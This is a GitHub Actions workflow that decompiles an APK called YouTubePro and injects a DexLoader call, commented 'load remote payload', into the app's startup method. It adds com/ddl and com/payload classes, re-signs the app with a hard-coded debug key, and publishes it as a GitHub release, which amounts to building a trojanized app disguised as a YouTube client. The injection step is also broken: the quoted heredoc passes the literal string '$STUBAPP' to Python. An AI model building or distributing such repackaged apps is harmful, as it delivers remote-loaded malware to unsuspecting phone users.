name: Build APK

on:
  push:
    branches: [main]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: write

    steps:
      - name: Checkout repo
        uses: actions/checkout@v4

      - name: Setup Java 17
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '17'

      - name: Install apktool
        run: |
          wget -q https://github.com/iBotPeaches/Apktool/releases/download/v2.11.1/apktool_2.11.1.jar \
               -O /usr/local/bin/apktool.jar
          printf '#!/bin/bash\njava -jar /usr/local/bin/apktool.jar "$@"\n' \
               | sudo tee /usr/local/bin/apktool > /dev/null
          sudo chmod +x /usr/local/bin/apktool
          apktool --version

      - name: Decompile original APK
        run: |
          ls -lh attached_assets/
          # Tanpa --no-src agar smali ter-decompile
          apktool d attached_assets/YouTubePro_1785357223541.apk \
            -o build/decompiled \
            -f
          echo "=== Struktur build/decompiled ==="
          ls build/decompiled/
          echo "=== Smali folders ==="
          ls build/decompiled/ | grep smali
          echo "=== Total smali files ==="
          find build/decompiled/ -name "*.smali" | wc -l
          echo "=== StubApp location ==="
          find build/decompiled/ -name "StubApp.smali"

      - name: Inject DexLoader into StubApp
        run: |
          STUBAPP=$(find build/decompiled/ -name "StubApp.smali" | head -1)
          echo "Found StubApp at: $STUBAPP"

          if [ -z "$STUBAPP" ]; then
            echo "StubApp not found - using from apk-source"
            STUBAPP="apk-source/YouTubePro/smali/com/stub/StubApp.smali"
            mkdir -p build/decompiled/smali/com/stub
            cp "$STUBAPP" build/decompiled/smali/com/stub/StubApp.smali
            STUBAPP="build/decompiled/smali/com/stub/StubApp.smali"
          fi

          if grep -q "DexLoader" "$STUBAPP"; then
            echo "✅ DexLoader already injected, skipping"
          else
            # Tambah DexLoader.locals ke method attachBaseContext
            # Inject setelah invoke-super attachBaseContext
            python3 << 'PYEOF'
          import re, sys

          with open("$STUBAPP", "r") as f:
              content = f.read()

          inject_line = '    invoke-static {p1}, Lcom/ddl/DexLoader;->load(Landroid/content/Context;)V'
          comment_line = '\n    # DDL: load remote payload\n'
          pattern = r'(invoke-super \{p0, p1\}, Landroid/app/Application;->attachBaseContext\(Landroid/content/Context;\)V)'
          replacement = r'\1' + comment_line + inject_line

          new_content = re.sub(pattern, replacement, content, count=1)
          if new_content == content:
              print("WARNING: pattern not found, trying alternate pattern")
              pattern2 = r'(invoke-super.*?attachBaseContext.*?Context;\)V)'
              new_content = re.sub(pattern2, r'\1' + comment_line + inject_line, content, count=1)

          with open("$STUBAPP", "w") as f:
              f.write(new_content)
          print("✅ DexLoader injected")
          PYEOF
          fi

          echo "=== Verify injection ==="
          grep -n "DexLoader" "$STUBAPP" || echo "Not found!"

      - name: Copy DDL smali classes into build
        run: |
          # Tentukan target smali folder (bisa smali atau smali_classesX)
          SMALI_DIR=$(find build/decompiled/ -maxdepth 1 -name "smali*" | sort | head -1)
          echo "Target smali dir: $SMALI_DIR"

          mkdir -p "$SMALI_DIR/com/ddl"
          mkdir -p "$SMALI_DIR/com/payload"

          # Copy semua DDL smali
          for f in apk-source/YouTubePro/smali/com/ddl/*.smali; do
            FNAME=$(basename "$f")
            # Skip jika sudah ada (dari decompile)
            if [ ! -f "$SMALI_DIR/com/ddl/$FNAME" ]; then
              cp "$f" "$SMALI_DIR/com/ddl/"
              echo "Copied: $FNAME"
            else
              echo "Skipped (exists): $FNAME"
            fi
          done

          echo "=== DDL classes ==="
          ls "$SMALI_DIR/com/ddl/"

      - name: Rebuild APK
        run: |
          mkdir -p output
          apktool b build/decompiled -o output/YouTubePro-mod-unsigned.apk
          echo "=== APK built ==="
          ls -lh output/YouTubePro-mod-unsigned.apk

      - name: Generate debug keystore
        run: |
          keytool -genkey -v \
            -keystore keystore.jks \
            -alias ytpro \
            -keyalg RSA \
            -keysize 2048 \
            -validity 10000 \
            -dname "CN=YouTubePro, OU=Dev, O=YTPro, L=ID, S=ID, C=ID" \
            -storepass ytpro123 \
            -keypass ytpro123 \
            -noprompt

      - name: Sign APK (zipalign + apksigner)
        run: |
          BUILD_TOOLS=$(ls $ANDROID_HOME/build-tools/ | sort -V | tail -1)
          BT="$ANDROID_HOME/build-tools/$BUILD_TOOLS"

          $BT/zipalign -v -p 4 \
            output/YouTubePro-mod-unsigned.apk \
            output/YouTubePro-mod-aligned.apk

          $BT/apksigner sign \
            --ks keystore.jks \
            --ks-key-alias ytpro \
            --ks-pass pass:ytpro123 \
            --key-pass pass:ytpro123 \
            --out output/YouTubePro-mod.apk \
            output/YouTubePro-mod-aligned.apk

          echo "=== ✅ APK signed ==="
          ls -lh output/YouTubePro-mod.apk

      - name: Upload APK artifact
        uses: actions/upload-artifact@v4
        with:
          name: YouTubePro-mod-${{ github.run_number }}
          path: output/YouTubePro-mod.apk
          retention-days: 30

      - name: Create GitHub Release
        uses: softprops/action-gh-release@v2
        with:
          tag_name: build-${{ github.run_number }}
          name: "Build #${{ github.run_number }}"
          body: |
            🤖 Auto-built APK from commit ${{ github.sha }}
            - Branch: ${{ github.ref_name }}
            - Date: ${{ github.event.head_commit.timestamp }}
          files: output/YouTubePro-mod.apk
          token: ${{ secrets.GITHUB_TOKEN }}
